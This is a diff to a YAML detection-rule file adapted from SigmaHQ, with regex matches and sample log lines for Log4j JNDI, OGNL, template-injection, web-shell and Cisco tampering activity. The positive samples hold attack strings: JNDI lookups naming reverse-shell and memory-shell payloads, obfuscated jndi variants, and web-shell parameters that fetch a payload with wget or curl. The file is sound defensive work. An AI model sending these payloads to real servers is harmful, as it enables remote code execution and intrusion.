+      - '203.0.113.71 - - [21/Nov/2026:09:01:47 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/JettyMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:48 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/WeblogicMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:49 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/JBossMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:50 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/WebsphereMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:51 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/SpringMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:52 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/URLDNS/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:53 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsCollections1/Dnslog/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:54 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsCollections2/Command/Base64/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:55 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/CommonsBeanutils1/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:56 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Deserialization/Jre8u20/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:57 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/Dnslog/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:58 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/Command/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:59 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:00 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:01 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/TomcatBypass/SpringMemshellx} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:02 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/GroovyBypass/Command/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:03 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/WebsphereBypass/Upload/x} HTTP/1.1" 200 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:19:00 +0000] "GET /docs/basic/commands.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:15:20:00 +0000] "GET /api/deserialization/status HTTP/1.1" 200 12 "-" "kube-probe/1.29"'
@@ -1607,7 +1708,6 @@
       - '${(#a=@'
       - '%24%7B%40java'
       - '${@java'
-      - 'u0022java'
       - '%2F%24%7B%23'
   case_sensitive: false
   strength: strong
@@ -1626,9 +1726,37 @@
   examples:
     positive:
       - '203.0.113.51 - - [20/Nov/2026:15:21:00 +0000] "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 302 0 "-" "python-requests/2.31"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:04 +0000] "GET /index.jsp?q=%24%7B%28%23a%3D%40 HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:05 +0000] "GET /index.jsp?q=${(#a=@ HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:06 +0000] "GET /index.jsp?q=${@java HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:07 +0000] "GET /index.jsp?q=%2F%24%7B%23 HTTP/1.1" 400 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:22:00 +0000] "GET /wiki/spaces/ENG/pages/123 HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:23:00 INFO  [main] java.lang.Runtime: available processors 8'
+
+- id: mention.sigma_java_payload_unicode_quote
+  title: 'Unicode escape u0022 before a java.* class name (Sigma "Java Payload Strings")'
+  match:
+    anchored: 'u0022java\.(?:lang|io|util|net|nio)\.'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Java Payload Strings (frack113, Harjot Singh, @cyb3rjy0t)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_java_payload_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
+  rationale: >-
+    The rule's 'u0022java' keyword with the class-name context it is there for: OGNL payloads against Confluence and
+    Struts escape the quote as \u0022 before java.lang.Runtime or java.io classes. The bare keyword is too short to
+    stand alone; JSON-escaped text that merely mentions java does not carry a package name after it.
+  examples:
+    positive:
+      - '203.0.113.51 - - [20/Nov/2026:15:21:30 +0000] "GET /pages/x.action?q=%7B%40java.lang.Class%40forName(%5Cu0022java.lang.Runtime%5Cu0022) HTTP/1.1" 302 0 "-" "-" decoded="\u0022java.lang.Runtime\u0022"'
+    negative:
+      - '2026-11-20 15:21:31 INFO  [main] api: {"lang":"\u0022javascript\u0022"}'
+      - '10.0.3.8 - - [20/Nov/2026:15:21:32 +0000] "GET /search?q=java HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_java_payload_short
   title: Short Java payload fragments (Sigma "Java Payload Strings")
@@ -1699,12 +1827,33 @@
     positive:
       - '203.0.113.52 - - [20/Nov/2026:15:27:00 +0000] "GET / HTTP/1.1" 200 812 "-" "${jndi:ldap://203.0.113.52:1389/a}"'
       - '2026-11-20 15:28:00 WARN  [http-nio-8080-exec-3] LoginController: failed login for user ${${lower:j}ndi:ldap://x.example.net/a}'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:08 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:rmi:/x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:09 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:ldaps:/x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:10 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:dns:/x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:11 +0000] "GET / HTTP/1.1" 200 0 "-" "/$%7bjndi:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:12 +0000] "GET / HTTP/1.1" 200 0 "-" "%24%7bjndi:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:13 +0000] "GET / HTTP/1.1" 200 0 "-" "$%7Bjndi:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:14 +0000] "GET / HTTP/1.1" 200 0 "-" "%2524%257Bjndix}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:15 +0000] "GET / HTTP/1.1" 200 0 "-" "%2F%252524%25257Bjndi%3Ax}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:16 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:${lower:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:17 +0000] "GET / HTTP/1.1" 200 0 "-" "${::-j}${x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:18 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:nisx}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:19 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:ndsx}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:20 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:corbax}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:21 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:iiopx}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:22 +0000] "GET / HTTP/1.1" 200 0 "-" "Reference Class Name: foox}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:23 +0000] "GET / HTTP/1.1" 200 0 "-" "${${env:BARFOO:-j}x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:24 +0000] "GET / HTTP/1.1" 200 0 "-" "${::-l}${::-d}${::-a}${::-p}x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:25 +0000] "GET / HTTP/1.1" 200 0 "-" "${base64:JHtqbmRpx}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:26 +0000] "GET / HTTP/1.1" 200 0 "-" "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:27 +0000] "GET / HTTP/1.1" 200 0 "-" "${${upper:j}ndi:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:28 +0000] "GET / HTTP/1.1" 200 0 "-" "${${::-j}${::-n}${::-d}${::-i}:x}"'
     negative:
       - '2026-11-20 15:29:00 INFO  [main] org.apache.catalina.core.NamingContextListener: Creating JNDI naming context'
       - '10.0.3.8 - - [20/Nov/2026:15:30:00 +0000] "GET /config?template=${user.home} HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_jvm_jndimanager
-  title: Log4j JndiManager in an application log (Sigma "Potential JNDI Injection Exploitation In JVM Based Application")
+  title: 'Log4j JndiManager class name in application text (Sigma JVM JNDI injection rule)'
   match:
     literal: ['org.apache.logging.log4j.core.net.JndiManager']
   case_sensitive: false
@@ -1727,7 +1876,7 @@
       - '2026-11-20 15:33:00 INFO  [main] org.apache.logging.log4j.core.appender.RollingFileAppender: rolled over'
 
 - id: mention.sigma_jvm_jndi_ldap
-  title: JDK LDAP JNDI classes in an application log (Sigma "Potential JNDI Injection Exploitation In JVM Based Application")
+  title: 'JDK LDAP JNDI class names in application text (Sigma JVM JNDI injection rule)'
   match:
     literal: ['com.sun.jndi.ldap.']
   case_sensitive: false
@@ -1741,7 +1890,7 @@
     upstream_id: bb0e9cec-d4da-46f5-997f-22efc59f3dca
   rationale: >-
     Exploited JNDI lookups leave com.sun.jndi.ldap frames in stack traces, but every Java application that talks to
-    a directory uses the same classes (LdapCtxFactory), so this is context only.
+    a directory uses the same classes (LdapCtxFactory), so this is a weak candidate.
   examples:
     positive:
       - '2026-11-20 15:34:00 ERROR [exec-4] javax.naming.CommunicationException: 203.0.113.52:1389 at com.sun.jndi.ldap.Connection.<init>(Connection.java:252)'
@@ -1750,7 +1899,7 @@
       - '2026-11-20 15:36:00 INFO  [main] javax.naming.InitialContext: environment loaded'
 
 - id: mention.sigma_jvm_ognl_exception
-  title: OGNL exception in an application log (Sigma "Potential OGNL Injection Exploitation In JVM Based Application")
+  title: 'OGNL exception name in application text (Sigma "Potential OGNL Injection Exploitation In JVM Based Application")'
   match:
     literal: ['org.apache.commons.ognl.OgnlException']
   case_sensitive: false
@@ -1788,7 +1937,7 @@
     upstream_id: d65f37da-a26a-48f8-8159-3dde96680ad2
   rationale: >-
     A JVM failing to start an external program, or an expression syntax error, can be an injected command that did not
-    resolve. Ordinary applications start helper programs and hit missing binaries too, so these are context only.
+    resolve. Ordinary applications start helper programs and hit missing binaries too, so these are weak candidates.
     ExpressionSyntaxException comes from the OGNL rule 4d0af518-828e-4a04-a751-a7d03f3046ad.
   examples:
     positive:
@@ -1835,7 +1984,7 @@
     upstream_id: 97661d9d-2beb-4630-b423-68985291a8af
   rationale: >-
     A child_process frame in a Node.js error can be an injected command that failed. Headless-browser and build tools
-    throw the same errors (the rule names Puppeteer), so it is context only.
+    throw the same errors (the rule names Puppeteer), so it is a weak candidate.
   examples:
     positive:
       - '2026-11-20 15:46:00 Error: spawn sh ENOENT at ChildProcess._handle.onexit (node:internal/child_process:284:19) at node:child_process:1'
@@ -1858,7 +2007,7 @@
     upstream_id: 16c86189-b556-4ee8-b4c7-7e350a195a4f
   rationale: >-
     Template parse failures follow template-injection probes, but missing or broken templates cause the same errors,
-    so they are context only.
+    so they are weak candidates.
   examples:
     positive:
       - '2026-11-20 15:49:00 ERROR [exec-2] org.apache.velocity.exception.ParseErrorException: Encountered "#set($x=" at line 1'
@@ -1913,6 +2062,8 @@
   examples:
     positive:
       - '203.0.113.53 - - [20/Nov/2026:15:55:00 +0000] "GET /preview?t=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")} HTTP/1.1" 200 12 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:29 +0000] "GET /index.jsp?q=.getClass().forName(''javax.script.ScriptEngineManager'') HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:30 +0000] "GET /index.jsp?q=T(org.apache.commons.io.IOUtils) HTTP/1.1" 400 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:56:00 +0000] "GET /docs/freemarker/template-guide HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:57:00 INFO  [main] freemarker.cache: Template loaded: welcome.ftl'
@@ -1956,7 +2107,7 @@
     upstream_id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342
   rationale: >-
     '${' opens EL, FreeMarker and Log4j expressions, but it also appears in shell-like configuration values and
-    templated links, so it is context only.
+    templated links, so it is a weak candidate.
   examples:
     positive:
       - '203.0.113.53 - - [20/Nov/2026:16:01:00 +0000] "GET /search?q=$%7B7*7%7D HTTP/1.1" 200 12 "-" "-"'
@@ -1965,7 +2116,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:03:00 +0000] "GET /a?b=%7Bc%7D HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_webshell_query_commands
-  title: Windows commands passed as URL parameters (Sigma "Windows Webshell Strings")
+  title: 'Windows commands as URL parameter values (Sigma "Windows Webshell Strings")'
   match:
     literal:
       - '=whoami'
@@ -2019,7 +2170,13 @@
 - id: mention.sigma_webshell_query_generic
   title: Generic tool names as URL parameters (Sigma "Windows Webshell Strings", noisy keywords)
   match:
-    literal: ['=ssh%', '=ssh+', '=python%', '=python+', '=python3%', '=python3+', '=wget%', '=wget+', '=curl%', '=curl+']
+    literal:
+      - '=ssh%'
+      - '=ssh+'
+      - '=python%'
+      - '=python+'
+      - '=python3%'
+      - '=python3+'
   case_sensitive: false
   strength: weak
   attack: [T1505.003]
@@ -2030,17 +2187,63 @@
     license: DRL-1.1
     upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
   rationale: >-
-    ssh, python, wget and curl followed by an argument are also ordinary search terms ('python+tutorial'), so these
-    keywords are context only.
+    ssh and python followed by an argument are also ordinary search terms ('python+tutorial'), so these
+    keywords are weak candidates.
   examples:
     positive:
-      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=wget+http://203.0.113.54/k HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=python+-c+import+os HTTP/1.1" 200 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:16:08:00 +0000] "GET /search?q=python HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:09:00 +0000] "GET /kb?topic=sshd_config HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
+- id: mention.sigma_webshell_query_curl_url
+  title: curl with a URL as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=curl(?:%20|\+)[^&\s"]{0,60}(?:https?|ftp)(?::|%3A)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=curl+' and '=curl%' keywords narrowed to a value that continues with a URL: a web shell told to
+    fetch a payload. Searches for the tool name rarely contain a full URL, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=curl+http://203.0.113.54/k HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:01 +0000] "GET /search?q=curl+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:02 +0000] "GET /kb?topic=curl%20options HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_webshell_query_wget_url
+  title: wget with a URL as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=wget(?:%20|\+)[^&\s"]{0,60}(?:https?|ftp)(?::|%3A)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=wget+' and '=wget%' keywords narrowed to a value that continues with a URL: a web shell told to
+    fetch a payload. Searches for the tool name rarely contain a full URL, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:00 +0000] "GET /up/x.php?cmd=wget+http://203.0.113.54/k HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:01 +0000] "GET /search?q=wget+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:02 +0000] "GET /kb?topic=wget%20options HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
 - id: mention.sigma_git_internals_request
-  title: Request for .git internals (Sigma "Source Code Enumeration Detection by Keyword", narrowed)
+  title: 'GET request line for .git internals (narrowing of Sigma "Source Code Enumeration Detection by Keyword")'
   match:
     anchored: 'GET /[^ \n]{0,200}\.git/(?:config|HEAD|index|logs/HEAD|ORIG_HEAD|packed-refs)'
   case_sensitive: false
@@ -2064,7 +2267,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:12:00 +0000] "GET /docs/git/config.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_cisco_clear_logs
-  title: Cisco logs or archive cleared (Sigma "Cisco Clear Logs")
+  title: 'Cisco clear logging or clear archive command text (Sigma "Cisco Clear Logs")'
   match:
     literal: ['clear logging', 'clear archive']
   case_sensitive: false
@@ -2124,7 +2327,7 @@
     upstream_id: 1f978c6a-4415-47fb-aca5-736a44d7ca3d
   rationale: >-
     Importing certificates or defining a trustpoint can plant a trusted root, but certificate renewals do exactly the
-    same, and the read-only 'show crypto pki trustpoints' contains the keyword, so it is context only.
+    same, and the read-only 'show crypto pki trustpoints' contains the keyword, so it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 16:19:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=crypto pki trustpoint EVIL-CA <cr>'
@@ -2133,7 +2336,7 @@
       - 'Nov 20 16:21:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=write memory <cr>'
 
 - id: mention.sigma_cisco_aaa_disabled
-  title: Cisco AAA model removed (Sigma "Cisco Disabling Logging")
+  title: 'Cisco no aaa new-model command text (Sigma "Cisco Disabling Logging")'
   match:
     literal: ['no aaa new-model']
   case_sensitive: false
@@ -2156,7 +2359,7 @@
       - 'Nov 20 16:24:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:aaa authentication login default group tacacs+ local'
 
 - id: mention.sigma_cisco_show_history
-  title: Cisco command history viewed (Sigma "Cisco Show Commands Input")
+  title: 'Cisco show history command text (Sigma "Cisco Show Commands Input")'
   match:
     literal: ['show history']
   case_sensitive: false
@@ -2170,7 +2373,7 @@
     upstream_id: b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b
   rationale: >-
     Reading the command history can reveal credentials typed by other administrators, but operators read their own
-    history all the time, so it is context only. 'show logging' is not imported: it is a routine command.
+    history all the time, so it is a weak candidate. 'show logging' is not imported: it is a routine command.
   examples:
     positive:
       - 'Nov 20 16:25:00 tacacs01 tac_plus[900]: 10.0.0.1 guest tty2 203.0.113.57 stop cmd=show history all <cr>'
@@ -2179,7 +2382,7 @@
       - 'Nov 20 16:27:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show interfaces status <cr>'
 
 - id: mention.sigma_cisco_packet_capture
-  title: Cisco embedded packet capture (Sigma "Cisco Sniffing")
+  title: 'Cisco monitor capture point command text (Sigma "Cisco Sniffing")'
   match:
     literal: ['monitor capture point']
   case_sensitive: false
@@ -2202,7 +2405,7 @@
       - 'Nov 20 16:30:00 rtr01 %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to up'
 
 - id: mention.sigma_cisco_span
-  title: Catalyst SPAN or RSPAN set (Sigma "Cisco Sniffing")
+  title: 'Catalyst ''set span'' or ''set rspan'' command text (Sigma "Cisco Sniffing")'
   match:
     literal: ['set span', 'set rspan']
   case_sensitive: false
@@ -2216,7 +2419,7 @@
     upstream_id: b9e1f193-d236-4451-aaae-2f3d2102120d
   rationale: >-
     Mirroring ports with SPAN copies traffic to a collector; security monitoring sensors are fed exactly this way, so
-    it is context only.
+    it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 16:31:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=set span 3/1 3/24 both <cr>'
@@ -2225,7 +2428,7 @@
       - 'Nov 20 16:33:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=set vlan 10 3/1 <cr>'
 
 - id: mention.sigma_cisco_config_register
-  title: Cisco configuration register set to bypass or ROMMON (Sigma "Cisco Denial of Service")
+  title: 'Cisco config-register 0x2142 or 0x2100 command text (Sigma "Cisco Denial of Service")'
   match:
     literal: ['config-register 0x2100', 'config-register 0x2142']
   case_sensitive: false
@@ -2248,7 +2451,7 @@
       - 'Nov 20 16:36:00 rtr01 %SYS-5-RELOAD: Reload requested by netadmin on vty0. Reload Reason: Reload Command.'
 
 - id: mention.sigma_cisco_dot1x_disabled
-  title: 802.1X port control forced open (Sigma "Cisco Dot1x Disabled")
+  title: '802.1X ''force-authorized'' or port-control removal command text (Sigma "Cisco Dot1x Disabled")'
   match:
     literal:
       - 'access-session port-control force-authorized'
@@ -2278,7 +2481,7 @@
       - 'Nov 20 16:39:00 sw01 %DOT1X-5-SUCCESS: Authentication successful for client (0011.2233.4455) on Interface Gi1/0/5'
 
 - id: mention.sigma_cisco_kron
-  title: Cisco kron scheduler configured (Sigma "Cisco Modify Configuration")
+  title: 'Cisco kron policy-list or occurrence command text (Sigma "Cisco Modify Configuration")'
   match:
     literal: ['kron policy-list', 'kron occurrence']
   case_sensitive: false
@@ -2317,7 +2520,7 @@
   rationale: >-
     Enabling the device web server opens a management surface with a long exploit history, and archive settings
     affect configuration evidence; both are routine configuration too, and the hardening command 'no ip http server'
-    contains the keyword, so they are context only.
+    contains the keyword, so they are weak candidates.
   examples:
     positive:
       - 'Nov 20 16:43:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip http server'
@@ -2326,7 +2529,7 @@
       - 'Nov 20 16:45:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip ssh version 2'
 
 - id: mention.sigma_cisco_config_dump
-  title: Cisco configuration displayed (Sigma "Cisco Collect Data")
+  title: 'Cisco show running-config or startup-config command text (Sigma "Cisco Collect Data")'
   match:
     literal: ['show running-config', 'show startup-config', 'show archive config']
   case_sensitive: false
@@ -2340,7 +2543,7 @@
     upstream_id: cd072b25-a418-4f98-8ebc-5093fb38fe1a
   rationale: >-
     Dumping the configuration exposes password hashes, SNMP communities and topology. It is also the most common
-    administrator command, so it is context only. The rule's 'more' keyword is not imported.
+    administrator command, so it is a weak candidate. The rule's 'more' keyword is not imported.
   examples:
     positive:
       - 'Nov 20 16:46:00 tacacs01 tac_plus[900]: 10.0.0.1 guest tty2 203.0.113.57 stop cmd=show running-config <cr>'
